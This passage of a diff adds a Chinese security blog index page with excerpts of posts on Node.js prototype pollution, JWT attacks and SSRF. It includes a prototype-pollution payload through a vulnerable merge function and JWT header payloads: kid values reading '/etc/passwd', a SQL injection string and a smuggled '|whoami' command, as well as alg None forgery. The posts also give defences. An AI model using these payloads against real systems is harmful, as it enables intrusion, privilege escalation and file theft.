+console.log(&quot;wuhu&quot;);
+</code></pre>
+<p>输出顺序不确定</p>
+<h3 id="全局变量："><a href="#全局变量：" class="headerlink" title="全局变量："></a>全局变量：</h3><ol>
+<li>__dirname：当前模块的目录名。</li>
+<li>__filename：当前模块的文件名。 这是当前的模块文件的绝对路径（符号链接会被解析）。</li>
+<li>exports变量是默认赋值给<code>module.exports</code>，它可以被赋予新值，它会暂时不会绑定到module.exports。</li>
+<li>module：在每个模块中， <code>module</code> 的自由变量是对表示当前模块的对象的引用。 为方便起见，还可以通过全局模块的 <code>exports</code> 访问 <code>module.exports</code>。 module 实际上不是全局的，而是每个模块本地的</li>
+<li>require模块就不多说了，用于引入模块、 JSON、或本地文件。 可以从 node_modules 引入模块。</li>
+</ol>
+<h3 id="简单的HTTP服务"><a href="#简单的HTTP服务" class="headerlink" title="简单的HTTP服务"></a>简单的HTTP服务</h3><pre><code> //引入http核心模块
+var http = require(&#39;http&#39;);
+//创建一个服务
+var server = http.createServer();
+//绑定连接
+server.on(&#39;request&#39;,function(res,rs)&#123;
+    console.log(res.method);//打印请求的方法
+    rs.write(&#39;hello,world!&#39;);//返回数据
+    rs.end();//断开连接
+&#125;)
+//启动监听
+server.listen(4444,function()&#123;
+    console.log(&#39;请访问127.0.0.1:4444&#39;);
+</code></pre>
+<h3 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a>child_process(创建子进程)</h3><p>child_process提供了几种创建子进程的方式</p>
+<p>异步方式：spawn、exec、execFile、fork<br>同步方式：spawnSync、execSync、execFileSync</p>
+<p>在异步创建进程时，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的。<br>同步创建进程可以使用<code>child_process.spawnSync()</code>、<code>child_process.execSync()</code> 和 <code>child_process.execFileSync()</code> ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。</p>
+<h3 id="JavaScript原型链"><a href="#JavaScript原型链" class="headerlink" title="JavaScript原型链"></a>JavaScript原型链</h3><p>JavaScript没有父类和子类这个概念，也没有类和实例的区分，而JavaScript中的继承关系则是靠一种很奇怪的“原型链”模式来实现继承。</p>
+<h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><pre><code>var a = &#123;
+    &quot;name&quot;: &quot;m0re&quot;,
+    &quot;blog&quot;: &quot;https://m0re.top&quot;
+&#125;
+a.name;
+a.blog;
+console.log(a);
+</code></pre>
+<p>访问属性：</p>
+<pre><code>//例如
+a.name;
+a[&quot;name&quot;];
+</code></pre>
+<h4 id="原型的定义和继承"><a href="#原型的定义和继承" class="headerlink" title="原型的定义和继承"></a>原型的定义和继承</h4><p>任何对象都有一个原型对象，这个原型对象由对象的内置属性proto指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的</p>
+<p>即对于如下代码</p>
+<pre><code>function Foo() &#123;
+    this.bar = 1
+&#125;
+
+Foo.prototype.show = function show() &#123;
+    console.log(this.bar)
+&#125;
+
+let foo = new Foo()
+foo.show()
+</code></pre>
+<p>有<code>foo.__proto__ == Foo.prototype</code></p>
+<p>关系如下图所示</p>
+<p><img src="/%E5%8D%81%E4%B8%80%C2%B7%EF%BC%8CNodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.assets/3.png" alt="3.png"></p>
+<p>总结一下：</p>
+<ol>
+<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+</ol>
+<p>继承eg：</p>
+<pre><code>function Father() &#123;
+    this.first_name = &#39;Donald&#39;
+    this.last_name = &#39;Trump&#39;
+&#125;
+
+function Son() &#123;
+    this.first_name = &#39;Melania&#39;
+&#125;
+
+Son.prototype = new Father()
+
+let son = new Son()
+console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)
+</code></pre>
+<p>输出结果为：Name: Melania Trump</p>
+<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
+<ol>
+<li>在对象son中寻找last_name</li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>eg;</p>
+<pre><code>// foo是一个简单的JavaScript对象
+let foo = &#123;bar: 1&#125;
+
+// foo.bar 此时为1
+console.log(foo.bar)
+
+// 修改foo的原型（即Object）
+foo.__proto__.bar = 2
+
+// 由于查找顺序的原因，foo.bar仍然是1
+console.log(foo.bar)
+
+// 此时再用Object创建一个空的zoo对象
+let zoo = &#123;&#125;
+
+// 查看zoo.bar
+console.log(zoo.bar)
+</code></pre>
+<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2</p>
+<p>这是因为修改了foo的原型（即Object），而我们又用Object类创建了zoo，那么zoo也具有了bar属性</p>
+<p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
+<p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p>
+<ul>
+<li>对象merge</li>
+<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
+</ul>
+<p>即如果可以：</p>
+<ul>
+<li>字符串可以被解析为方法或对象。例如：Json.parse 进行解析、shvl 库使用点对属性操作。</li>
+<li>对象的键和值都可控。target[key] &#x3D; value，其中 key 和 value 均可控制。</li>
+</ul>
+<p>基本确认存在漏洞</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>以对象merge为例</p>
+<p>一个简单的merge函数</p>
+<pre><code>function merge(target, source) &#123;
+    for (let key in source) &#123;
+        if (key in source &amp;&amp; key in target) &#123;
+            merge(target[key], source[key])
+        &#125; else &#123;
+            target[key] = source[key]
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
+<p>测试1：</p>
+<pre><code>let o1 = &#123;&#125;
+let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 = &#123;&#125;
+console.log(o3.b)
+</code></pre>
+<p>o结果输出3并没有b属性，即o2没有污染原型链。这是因为o2在创建时，将<code>__proto__</code>当作要指定的原型链而没当作键名</p>
+<p>测试2：</p>
+<pre><code>let o1 = &#123;&#125;
+let o2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)
+merge(o1, o2)
+console.log(o1.a, o1.b)
+
+o3 = &#123;&#125;
+console.log(o3.b)
+</code></pre>
+<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染</p>
+<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
+<p>一些常见的污染方法：</p>
+<ul>
+<li><code>function.__proto__.polluted</code>。</li>
+<li><code>function.prototype.polluted</code>。</li>
+<li><code>obj.__proto__.pollluted</code>。</li>
+<li><code>obj.constructor.polluted</code>。</li>
+</ul>
+<p>从污染到rce：创建exec的子进程</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>如果系统中有键值的操作，并且键和值来自外部输入。可以考虑进行过滤：</p>
+<ul>
+<li>禁止操作 <code>constructor</code></li>
+<li>禁止操作 <code>prototype</code></li>
+<li>禁止操作 <code>__proto__</code></li>
+</ul>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>是否过滤完全？<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/355840263">https://zhuanlan.zhihu.com/p/355840263</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=2#reply-list</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236182">https://www.anquanke.com/post/id/236182</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.codesec.work/f0ee9a055ee1/">https://blog.codesec.work/f0ee9a055ee1/</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/十一·，Nodejs原型链污染/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/十二，JWT/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>
+<p>jwt由三个部分组成：<code>header</code>.<code>payload</code>.<code>signature</code></p>
+<p><strong>header：</strong></p>
+<p>使用一个JSON格式字符串声明令牌的类型和签名用的算法等，形如：</p>
+<pre><code>&#123;
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+&#125;
+</code></pre>
+<p>header声明的一些标准</p>
+<p><img src="/%E5%8D%81%E4%BA%8C%EF%BC%8CJWT.assets/image-20220411091230813.png" alt="image-20220411091230813"></p>
+<p><strong>payload：</strong></p>
+<p>Payload 部分也是一个 JSON 对象，是用户数据以及一些元数据有关的声明，用以声明权限。包含官方字段和私有字段</p>
+<p>eg：</p>
+<pre><code>&#123;
+        &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户
+    &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者
+    &quot;iat&quot;: 1573440582,        //签发时间
+    &quot;exp&quot;: 1573940267,        //过期时间
+    &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token
+    &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户
+    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识
+&#125;
+</code></pre>
+<p><strong>signature：</strong></p>
+<p>signature的功能是保护token完整性。</p>
+<p>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。</p>
+<p>抽象成公式就是</p>
+<pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)
+</code></pre>
+<p>值得注意的是，编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准Base64中的”+”和”&#x2F;“分别改成了”-“和”_”。</p>
+<p><strong>生成完整的token</strong>：</p>
+<p>python的<code>Pyjwt</code>使用示例如下</p>
+<pre><code>import jwt
+
+encoded_jwt = jwt.encode(&#123;&#39;user_name&#39;: &#39;admin&#39;&#125;, &#39;key&#39;, algorithm=&#39;HS256&#39;)
+print(encoded_jwt)
+print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))
+</code></pre>
+<p><strong>解码</strong></p>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>公钥泄露</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><h4 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h4><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code>。</p>
+<p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。</p>
+<p>空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>
+<h4 id="修改RSA加密算法为HMAC"><a href="#修改RSA加密算法为HMAC" class="headerlink" title="修改RSA加密算法为HMAC"></a>修改RSA加密算法为HMAC</h4><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code>。</p>
+<p><code>HMAC</code>是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。</p>
+<p><code>RSA</code>则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p>
+<p>在HMAC和RSA算法中，都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
+<p>私钥通常很难获取，而公钥有时却可以通过某些途径获取</p>
+<p>这时，将JWT的加密算法修改为HMAC，并使用公钥作为算法密钥，对token进行签名，发送到服务端。</p>
+<p>服务器端会将RSA的公钥（<code>pub</code>）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。而HMAC算法只使用一个密钥。</p>
+<h3 id="密钥爆破"><a href="#密钥爆破" class="headerlink" title="密钥爆破"></a>密钥爆破</h3><p>对 JWT 的密钥爆破需要在一定的前提下进行：</p>
+<ul>
+<li>知悉JWT使用的加密算法</li>
+<li>一段有效的、已签名的token</li>
+<li>签名用的密钥不复杂（弱密钥）</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<h3 id="修改kid参数"><a href="#修改kid参数" class="headerlink" title="修改kid参数"></a>修改kid参数</h3><p><code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥</p>
+<p>eg：</p>
+<pre><code>&#123;
+    &quot;alg&quot; : &quot;HS256&quot;,
+    &quot;typ&quot; : &quot;jwt&quot;,
+    &quot;kid&quot; : &quot;/home/jwt/.ssh/pem&quot;
+&#125;
+</code></pre>
+<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以使用kid读取到系统的任意文件的。</p>
+<pre><code>&#123;
+    &quot;alg&quot; : &quot;HS256&quot;,
+    &quot;typ&quot; : &quot;jwt&quot;,
+    &quot;kid&quot; : &quot;/etc/passwd&quot;
+&#125;
+</code></pre>
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证</p>
+<pre><code>&#123;
+    &quot;alg&quot; : &quot;HS256&quot;,
+    &quot;typ&quot; : &quot;jwt&quot;,
+    &quot;kid&quot; : &quot;key11111111&#39; || union select &#39;secretkey&#39; -- &quot;
+&#125;
+</code></pre>
+<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>对<code>kid</code>参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了<code>open</code>函数，通过构造参数就可能造成命令注入。</p>
+<pre><code>&quot;/path/to/key_file|whoami&quot;
+</code></pre>
+<p>对于其他的语言，例如php，如果代码中使用的是<code>exec</code>或者是<code>system</code>来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。</p>
+<h3 id="修改JKU-x2F-X5U参数"><a href="#修改JKU-x2F-X5U参数" class="headerlink" title="修改JKU&#x2F;X5U参数"></a>修改JKU&#x2F;X5U参数</h3><ul>
+<li>JWS：Signed JWT，签名过的jwt</li>
+<li>JWK：JWT的密钥，也就是我们常说的scret；</li>
+<li>JWE：Encrypted JWT部分payload经过加密的jwt；</li>
+<li>jku：”jku” (JSON Web Key Set URL) 是jwt header中的一个字段，字段内容是一个URI，该URI用于指定用于验证令牌秘钥的服务器，该服务器用于回复jwk。</li>
+<li>x5u：”x5u” 也是jwt header中的一个字段，指向一组X509公共证书的URL，与jku功能类似</li>
+<li>X.509 标准<ul>
+<li>X.509 标准是密码学里公钥证书的格式标准,包括TLS&#x2F;SSL(WWW万维网安全浏览的基石)在内的众多 Internet协议都应用了X.509 证书）</li>
+</ul>
+</li>
+</ul>
+<p><code>JKU</code>的全称是”JSON Web Key Set URL”，用于指定一组用于验证令牌的密钥的URL。类似于<code>kid</code>，<code>JKU</code>也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。</p>
+<p><code>X5U</code>则以URI的形式数允许攻击者指定用于验证令牌的<strong>公钥证书或证书链</strong>，与<code>JKU</code>的攻击利用方式类似。</p>
+<p>jku工作原理</p>
+<p>1，用户携带jws访问应用</p>
+<p>2，应用解码jwws得到jku</p>
+<p>3，应用根据jku访问jwk服务器</p>
+<p>4，应用得到jwk</p>
+<p>5，应用使用jwk验证用户jws</p>
+<p>6，验证通过，正常回显</p>
+<p>攻击：</p>
+<ol>
+<li>攻击者使用伪造的JWS访问应用，jku字段指向自己控制的服务器。</li>
+<li>应用程序得到jku后对恶意服务器进行访问，得到伪造的JWK。</li>
+<li>攻击者的JWS成功得到验证，进而可以越权访问应用</li>
+</ol>
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>JWT保证的是数据传输过程中的完整性而不是机密性。</p>
+<p>由于payload是使用<code>base64url</code>编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行<code>base64url</code>解码，就可以读取到payload中携带的信息。</p>
+<h3 id="错误的堆叠加密-签名验证假设"><a href="#错误的堆叠加密-签名验证假设" class="headerlink" title="错误的堆叠加密+签名验证假设"></a>错误的堆叠加密+签名验证假设</h3><h4 id="错误的堆叠加密"><a href="#错误的堆叠加密" class="headerlink" title="错误的堆叠加密"></a>错误的堆叠加密</h4><p>这种攻击发生在单个的或者嵌套的JWE中</p>
+<p>假设JWE如下所示：</p>
+<pre><code>header : ...
+
+    payload: &quot;admin&quot; : false
+
+             &quot;uid&quot;   : 123
+
+             &quot;umail&quot; : 123@126.com
+
+             ...
+
+JWE Main
+
+    protected / unprotected
+
+    recipients:
+
+        en_key : key1
+
+        en_key : key2
+
+    cipher : xxx
+</code></pre>
+<p>在攻击者不修改秘钥的情况下，对于ciphertext进行修改。往往会导致解密的失败。但是，即使是失败，很多JWT的解密也是会有输出的，在没有附加认证数据（ADD）的情况下更是如此。攻击者对于ciphertext的内容进行修改，可能会让其他的数据无法解密，但是只要最后输出的payload中，有“admin”:true。 其目的就已经达到了。</p>
+<h4 id="签名假设验证"><a href="#签名假设验证" class="headerlink" title="签名假设验证"></a>签名假设验证</h4><p>这种攻击发生嵌套的JWS中。我们想象一个嵌套的JWS,其包括了两层的部分，其结构如下：</p>
+<pre><code>JWT Main
+
+    JWT Sub1
+
+        payload
+
+        Signature2
+
+    Signature
+</code></pre>
+<p>现在，攻击者通过一定的方式，能够让外层的验证通过的时候，此时，系统还应该检查内层的签名数据，如果不检查，攻击者就可以随意篡改payload的数据，来达到越权的目的。</p>
+<h3 id="无效椭圆曲线攻击"><a href="#无效椭圆曲线攻击" class="headerlink" title="无效椭圆曲线攻击"></a>无效椭圆曲线攻击</h3><p>椭圆曲线加密是一种非常安全的方式，甚至从某种程度上而言，比RSA更加安全。关于椭圆曲线的算法，在此不展开。</p>
+<p>在椭圆曲线加密中，公钥是椭圆曲线上的一个点，而私钥只是一个位于特殊但非常大的范围内的数字。 如果未验证对这些操作的输入，那攻击者就可以进行设计，从而恢复私钥。</p>
+<p>而这种攻击已在过去中得到证实。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1515376">https://cloud.tencent.com/developer/article/1515376</a></p>
+<h3 id="替换攻击"><a href="#替换攻击" class="headerlink" title="替换攻击"></a>替换攻击</h3><p>攻击者需要至少获得两种不同的JWT，然后攻击者可以将令牌中的一个或者两个用在其他的地方。</p>
+<h4 id="不同接收方攻击"><a href="#不同接收方攻击" class="headerlink" title="不同接收方攻击"></a>不同接收方攻击</h4><p>我们可以设想一个业务逻辑如下：</p>
+<blockquote>
+<p>Auth 机构，有着自己的私钥，并且给 App1 和 App2 发放了两个公钥，用于验证签名；</p>
+<p>Attacker 利用自己的秘钥登录了 App1。</p>
+</blockquote>
+<p>此时 Auth 机构给 Attacker 下发了一个 附带签名的JWT，其payload内容为：</p>
+<pre><code>&#123;
+    &#39;uname&#39;:&#39;Attacker&#39;
+    &#39;role&#39; :&#39;admin&#39;
+&#125;
+</code></pre>
+<p>此时，如果 Attacker 知道 App1 和 App2 的公钥是同一个Auth 签发的话，他可以利用这个JWT去登录 App2，从而获取Admin权限。</p>
+<h4 id="相同接收方攻击-x2F-跨越式JWT-same-recipient-x2F-Cross-JWT"><a href="#相同接收方攻击-x2F-跨越式JWT-same-recipient-x2F-Cross-JWT" class="headerlink" title="相同接收方攻击&#x2F;跨越式JWT same recipient&#x2F;Cross JWT"></a>相同接收方攻击&#x2F;跨越式JWT same recipient&#x2F;Cross JWT</h4><p>我们可以设想一个业务逻辑如下：</p>
+<blockquote>
+<p>在同一站点下，有两个应用程序，wordpress和phpmyadmin，他们都利用了相同的秘钥对和算法来验证JWT签名；</p>
+<p>站点管理员知道 Different Recipient 的问题，所以给 wordpress 的应用增加了 aud 验证，但是 phpmyadmin 的用户人数较少，没有增加 aud 的验证；</p>
+<p>Attacker 利用自己的秘钥登录了 wordpress。</p>
+</blockquote>
+<p>此时 站点 给 Attacker 下发了一个 附带签名的JWT，其payload内容为：</p>
+<pre><code>&#123;
+    &#39;uname&#39;:&#39;Attacker&#39;
+    &#39;role&#39; :&#39;writer&#39;
+    &#39;aud&#39; :&#39;shaobaobaoer.cn/wordpress&#39;
+    &#39;iss&#39; :&#39;shaobaobaoer.cn&#39;
+&#125;
+</code></pre>
+<p>这个JWT看似非常安全，但这仅仅是对于 wordpress 的应用程序而言，。从而Attacker 可以以 writer 的身份登录 phpmyadmin。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1，不允许出现 none 的方法；</p>
+<p>将开启 alg : none 作为一种额外的配置选项。</p>
+<p>2，不允许 HS256等对称加密 算法读取秘钥。jwtpy就是限制了这种方法。当读取到 类似于 “— xxx key —“ 的参数的时候应抛出错误；</p>
+<p>将秘钥与验证算法相互匹配。</p>
+<p>3，对于JWE而言，应当解密所有数据，而非从解密的结果中提取单个需要的数据。另外，利用附加认证数据ADD，也是非常好的选择</p>
+<p>对于嵌套JWS而言，应当验证所有层面的签名是否正确，而非验证最外层的签名是否正确就足够。</p>
+<p>4，检查传递给任何公共函数的所有输入是否有效是解决这类攻击的关键点。验证内容包括公钥是所选曲线的有效椭圆曲线点，以及私钥位于有效值范围内</p>
+<p>5，在jwt中带上 aud 声明，比如 aud : App1 这样。来限定该jwt只能用于App1。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6776">https://xz.aliyun.com/t/6776</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236830">https://www.anquanke.com/post/id/236830</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/180874.html">https://www.freebuf.com/articles/web/180874.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/十二，JWT/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/一，ssrf漏洞/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="一，ssrf漏洞"><a href="#一，ssrf漏洞" class="headerlink" title="一，ssrf漏洞"></a>一，ssrf漏洞</h1><p>许多web应用提供了向其它服务器获取数据的功能，根据指定的url，web应用可以下载文件，获取图片等。如果这种功能没有做好防御手段，就容易被攻击者恶意利用。这种形式的攻击被称为服务端请求伪造攻击（Server-side Request Forgery，SSRF）</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>社交分享功能</strong>：获取超链接的标题等内容进行显示</p>
+<p><strong>转码服务</strong>：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+<p><strong>在线翻译</strong>：给网址翻译对应网页的内容</p>
+<p><strong>图片加载&#x2F;下载</strong>：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
+<p><strong>图片&#x2F;文章收藏功能</strong>：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
+<p><strong>云服务厂商</strong>：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
+<p><strong>网站采集，网站抓取的地方</strong>：一些网站会针对你输入的url进行一些信息采集工作</p>
+<p><strong>数据库内置功能</strong>：数据库的比如mongodb的copyDatabase函数</p>
+<p><strong>邮件系统</strong>：比如接收邮件服务器地址</p>
+<p><strong>编码处理, 属性信息处理，文件处理</strong>：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
+<p><strong>未公开的api实现以及其他扩展调用URL的功能</strong>：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<p><strong>一些的url中的关键字</strong>：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
+<p><strong>从远程服务器请求资源</strong>（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
+<p><strong>源码里的一些函数</strong></p>
+<p>Php：file_get_contents，fsockopen，curl_exec</p>
+<p>Java：HttpURLConnection.getInputStream()，URLConnection.getInputStream()，Request.Get.execute()，Request.Post.execute()，URL.openStream()，ImageIO.read()，OkHttpClient.newCall.execute()，HttpClents.execute()，HttpClent.execute()</p>
+<h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><p>1.基本判断（排除法）<br>如：<a target="_blank" rel="noopener" href="http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png">http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</a><br>排除法一：直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a target="_blank" rel="noopener" href="http://www.baidu.com/img/bd_logo1.png%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%B8%8D%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E3%80%82">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a><br>排除法二：使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p>
+<p>2.DNSLog 服务</p>
+<p>生成一个域名（<a target="_blank" rel="noopener" href="http://l08bgh.dnslog.cn)用于伪造请求,看漏洞服务器(ip)是否发起/">http://l08bgh.dnslog.cn）用于伪造请求，看漏洞服务器(ip)是否发起</a> DNS 解析请求，若成功访问在 <a target="_blank" rel="noopener" href="http://dnslog.cn/">http://DNSLog.cn</a> 上就会有解析日志。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a><strong>伪协议</strong></h3><p>php ssrf中的伪协议：<br> file;dict;sftp;ldap;tftp;gopher;http</p>
+<p> Java ssrf 中的伪协议：<br> file;ftp;mailto;http;https;jar;netdoc;gopher</p>
+<p>file:&#x2F;&#x2F;&#x2F;协议：从本地文件系统中获取文件</p>
+<p>dict:&#x2F;&#x2F;协议：一个字典服务器协议，默认使用端口 2628</p>
+<p>gopher:&#x2F;协议：一种通信协议，旨在在Internet协议网络中分发，搜索和检索文档。默认使用端口70。</p>
+<p>sftp:&#x2F;&#x2F;协议：SSH文件传输协议（SSH File Transfer Protocol）</p>
+<p>tftp:&#x2F;&#x2F;协议：进行简单文件传输的协议，使用69端口</p>
+<p>ldap:&#x2F;&#x2F;, ldaps:&#x2F;&#x2F;, ldapi:&#x2F;&#x2F;协议：轻型目录访问协议</p>
